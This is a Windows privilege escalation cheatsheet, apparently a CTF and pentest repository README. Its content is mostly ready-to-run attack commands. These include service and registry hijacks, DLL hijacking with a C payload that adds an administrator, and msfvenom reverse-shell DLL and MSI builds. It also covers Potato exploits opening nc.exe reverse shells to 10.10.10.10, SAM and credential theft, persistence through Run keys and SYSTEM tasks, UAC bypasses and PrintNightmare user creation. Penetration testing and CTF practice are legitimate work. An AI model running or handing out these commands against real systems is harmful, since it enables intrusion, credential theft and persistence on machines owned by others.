# 🪟 Windows Privilege Escalation - Complete Cheatsheet

```
  ██╗    ██╗██╗███╗   ██╗██████╗  ██████╗ ██╗    ██╗███████╗
  ██║    ██║██║████╗  ██║██╔══██╗██╔═══██╗██║    ██║██╔════╝
  ██║ █╗ ██║██║██╔██╗ ██║██║  ██║██║   ██║██║ █╗ ██║███████╗
  ██║███╗██║██║██║╚██╗██║██║  ██║██║   ██║██║███╗██║╚════██║
  ╚███╔███╔╝██║██║ ╚████║██████╔╝╚██████╔╝╚███╔███╔╝███████║
   ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚══════╝
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Windows-PrivEsc-blue?style=for-the-badge" alt="Windows PrivEsc">
  <img src="https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge" alt="Post Exploitation">
  <img src="https://img.shields.io/badge/SYSTEM-Access-red?style=for-the-badge" alt="SYSTEM">
  <img src="https://img.shields.io/badge/CTF-Ready-green?style=for-the-badge" alt="CTF">
</p>

<p align="center">
  <b>🔓 Complete guide to escalating privileges on Windows systems</b>
</p>

---

## 📋 Table of Contents

- [Enumeration](#-enumeration)
- [Service Exploitation](#-service-exploitation)
- [Unquoted Service Paths](#-unquoted-service-paths)
- [DLL Hijacking](#-dll-hijacking)
- [AlwaysInstallElevated](#-alwaysinstallelevated)
- [Stored Credentials](#-stored-credentials)
- [Token Manipulation](#-token-manipulation)
- [Potato Attacks](#-potato-attacks)
- [Registry Exploits](#-registry-exploits)
- [Scheduled Tasks](#-scheduled-tasks)
- [UAC Bypass](#-uac-bypass)
- [Kernel Exploits](#-kernel-exploits)
- [Quick Reference](#-quick-reference)

---

## 🔍 Enumeration

### System Information

```cmd
# System info
systeminfo
hostname

# OS version
ver
wmic os get caption,version,buildnumber

# Architecture
echo %PROCESSOR_ARCHITECTURE%

# Patches/Hotfixes
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### User Information

```cmd
# Current user
whoami
whoami /all
whoami /priv
whoami /groups

# All users
net user
net localgroup administrators

# User details
net user username

# Current privileges
whoami /priv
```

### Network Information

```cmd
# IP config
ipconfig /all

# Routes
route print

# Open ports
netstat -ano
netstat -an | findstr LISTENING

# ARP table
arp -a

# DNS cache
ipconfig /displaydns
```

### Process & Services

```cmd
# Running processes
tasklist
tasklist /svc
wmic process list full

# Services
sc query
net start
wmic service list brief

# Drivers
driverquery
```

### PowerShell Enumeration

```powershell
# System info
Get-ComputerInfo

# Users
Get-LocalUser
Get-LocalGroupMember Administrators

# Services
Get-Service

# Processes
Get-Process

# Installed software
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, Publisher, InstallDate
```

---

## ⚙️ Service Exploitation

### Find Vulnerable Services

```cmd
# List services
sc query state= all

# Service permissions
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *

# Check specific service
sc qc servicename
```

### Weak Service Permissions

```cmd
# If you can modify service config:
sc config servicename binpath= "C:\Users\Public\shell.exe"
sc config servicename binpath= "net localgroup administrators user /add"
sc stop servicename
sc start servicename
```

### Weak Service Binary Permissions

```cmd
# Check binary permissions
icacls "C:\Program Files\Service\binary.exe"

# If writable, replace with malicious binary
copy shell.exe "C:\Program Files\Service\binary.exe"
sc stop servicename
sc start servicename
```

### PowerShell Service Check

```powershell
# Get service info
Get-WmiObject win32_service | Select-Object Name, StartName, PathName

# Find modifiable services
Get-ModifiableService
```

---

## 📂 Unquoted Service Paths

### Find Unquoted Paths

```cmd
# Find unquoted service paths
wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# PowerShell
Get-WmiObject win32_service | Select-Object Name,PathName | Where-Object {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'}
```

### Exploit Unquoted Path

```
# If path is: C:\Program Files\Vulnerable Service\service.exe
# Windows searches:
# 1. C:\Program.exe
# 2. C:\Program Files\Vulnerable.exe
# 3. C:\Program Files\Vulnerable Service\service.exe

# Place malicious exe:
copy shell.exe "C:\Program Files\Vulnerable.exe"

# Restart service
sc stop "Vulnerable Service"
sc start "Vulnerable Service"
```

---

## 📚 DLL Hijacking

### Find Missing DLLs

```cmd
# Use Process Monitor to find missing DLLs
# Filter: Result = NAME NOT FOUND, Path ends with .dll

# Common locations checked:
# 1. Application directory
# 2. C:\Windows\System32
# 3. C:\Windows
# 4. Current directory
# 5. Directories in PATH
```

### Create Malicious DLL

```c
// msfvenom payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll -o evil.dll

// Or compile custom DLL:
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net localgroup administrators user /add");
    }
    return TRUE;
}
```

### Exploit

```cmd
# Copy DLL to writable directory in search path
copy evil.dll "C:\Program Files\App\missing.dll"

# Trigger application to load DLL
# Restart service or application
```

---

## 📦 AlwaysInstallElevated

### Check for Vulnerability

```cmd
# Both must be set to 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Exploit

```bash
# Generate malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o evil.msi

# Transfer and execute
msiexec /quiet /qn /i evil.msi
```

---

## 🔑 Stored Credentials

### Credential Manager

```cmd
# List stored credentials
cmdkey /list

# Use saved credentials
runas /savecred /user:Administrator cmd.exe
```

### SAM & SYSTEM

```cmd
# Copy SAM files (need SYSTEM)
copy C:\Windows\System32\config\SAM C:\Users\Public\SAM
copy C:\Windows\System32\config\SYSTEM C:\Users\Public\SYSTEM

# From shadow copies
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .
```

### Registry Credentials

```cmd
# Autologon passwords
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# VNC passwords
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Putty sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

### Files with Passwords

```cmd
# Search for passwords
findstr /si password *.txt *.xml *.ini *.config
findstr /spin "password" *.*

# Unattend files
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\System32\sysprep.inf
C:\Windows\System32\sysprep\sysprep.xml

# PowerShell history
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# IIS config
type C:\inetpub\wwwroot\web.config
```

### WiFi Passwords

```cmd
# List profiles
netsh wlan show profiles

# Get password
netsh wlan show profile name="SSID" key=clear
```

---

## 🎭 Token Manipulation

### Check Privileges

```cmd
whoami /priv

# Dangerous privileges:
# SeImpersonatePrivilege
# SeAssignPrimaryTokenPrivilege
# SeTcbPrivilege
# SeBackupPrivilege
# SeRestorePrivilege
# SeCreateTokenPrivilege
# SeLoadDriverPrivilege
# SeTakeOwnershipPrivilege
# SeDebugPrivilege
```

### SeImpersonatePrivilege

```cmd
# If SeImpersonatePrivilege is enabled:
# Use Potato attacks (JuicyPotato, PrintSpoofer, etc.)

# PrintSpoofer
PrintSpoofer.exe -i -c "cmd"
PrintSpoofer.exe -c "C:\Users\Public\nc.exe 10.10.10.10 4444 -e cmd"

# GodPotato
GodPotato.exe -cmd "cmd /c whoami"
```

### SeBackupPrivilege

```cmd
# Can read any file
# Copy SAM and SYSTEM
robocopy /b C:\Windows\System32\config C:\Users\Public SAM SYSTEM
```

### SeRestorePrivilege

```cmd
# Can write to any location
# Replace system files
```

---

## 🥔 Potato Attacks

### JuicyPotato (Windows Server 2016/2019)

```cmd
# Requires SeImpersonatePrivilege or SeAssignPrimaryToken
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup administrators user /add" -t *
```

### PrintSpoofer (Windows 10/Server 2016+)

```cmd
# Requires SeImpersonatePrivilege
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "nc.exe 10.10.10.10 4444 -e cmd"
```

### RoguePotato

```cmd
RoguePotato.exe -r 10.10.10.10 -e "cmd /c whoami > C:\Users\Public\out.txt" -l 9999
```

### GodPotato (Windows 10/11/Server 2019-2022)

```cmd
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 10.10.10.10 4444"
```

---

## 📝 Registry Exploits

### AutoRuns

```cmd
# Check autorun locations
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# If writable, add malicious entry
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Users\Public\shell.exe"
```

### Service Registry Keys

```cmd
# Check service registry permissions
accesschk.exe -kvuqws "Everyone" HKLM\System\CurrentControlSet\Services

# Modify service ImagePath
reg add "HKLM\SYSTEM\CurrentControlSet\Services\vulnerable" /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\Public\shell.exe" /f
```

---

## ⏰ Scheduled Tasks

### List Scheduled Tasks

```cmd
schtasks /query /fo LIST /v
schtasks /query /fo TABLE

# PowerShell
Get-ScheduledTask | Select-Object TaskName, TaskPath, State
```

### Find Writable Task Scripts

```cmd
# If task runs a script you can modify:
icacls "C:\Scripts\backup.bat"

# Add malicious command
echo net localgroup administrators user /add >> C:\Scripts\backup.bat
```

### Create Malicious Task

```cmd
# If you have permission to create tasks
schtasks /create /tn "Evil" /tr "C:\Users\Public\shell.exe" /sc onlogon /ru SYSTEM
```

---

## 🛡️ UAC Bypass

### Check UAC Level

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

### Fodhelper Bypass

```cmd
# Works on Windows 10
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
fodhelper.exe

# Clean up
reg delete HKCU\Software\Classes\ms-settings /f
```

### EventViewer Bypass

```cmd
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
eventvwr.exe
```

---

## 💣 Kernel Exploits

### Check System Info

```cmd
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Common Exploits

| CVE | Windows Version | Name |
|-----|-----------------|------|
| MS08-067 | XP/2003 | NetAPI |
| MS16-032 | 7/8/10/2012 | Secondary Logon |
| MS17-010 | All | **EternalBlue** |
| CVE-2020-0796 | 10/Server 2019 | **SMBGhost** |
| CVE-2021-1732 | 10/Server | Win32k |
| CVE-2021-34527 | All | **PrintNightmare** |

### PrintNightmare (CVE-2021-34527)

```cmd
# Check if vulnerable
Get-Service Spooler

# Exploit (PowerShell)
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "password123!" -DriverName "Xerox"
```

---

## 📊 Quick Reference

### One-Liner Enumeration

```cmd
# Quick info
whoami /all & systeminfo & net user

# Check privileges
whoami /priv

# Services
wmic service get name,pathname | findstr /i /v "c:\windows"

# Scheduled tasks
schtasks /query /fo LIST /v | findstr /i "taskname\|run"
```

### Automated Tools

| Tool | Description |
|------|-------------|
| **WinPEAS** | Comprehensive enumeration |
| **PowerUp** | PowerShell privesc |
| **Seatbelt** | Security checks |
| **SharpUp** | C# privesc checks |

### Quick Wins Checklist

- [ ] `whoami /priv` - Check SeImpersonate
- [ ] Unquoted service paths
- [ ] Writable service binaries
- [ ] AlwaysInstallElevated
- [ ] Stored credentials (cmdkey /list)
- [ ] Autologon passwords in registry
- [ ] Weak service permissions
- [ ] Scheduled task scripts
- [ ] Kernel version - PrintNightmare?

---

## 📚 Resources

- [LOLBAS](https://lolbas-project.github.io/)
- [HackTricks Windows PrivEsc](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

### Related Cheatsheets
- [WinPEAS](../WinPEAS/README.md)
- [Linux PrivEsc](../Linux-PrivEsc/README.md)

---

<p align="center">
  <b>🪟 Get SYSTEM!</b><br>
  <i>Master Windows Privilege Escalation</i>
</p>
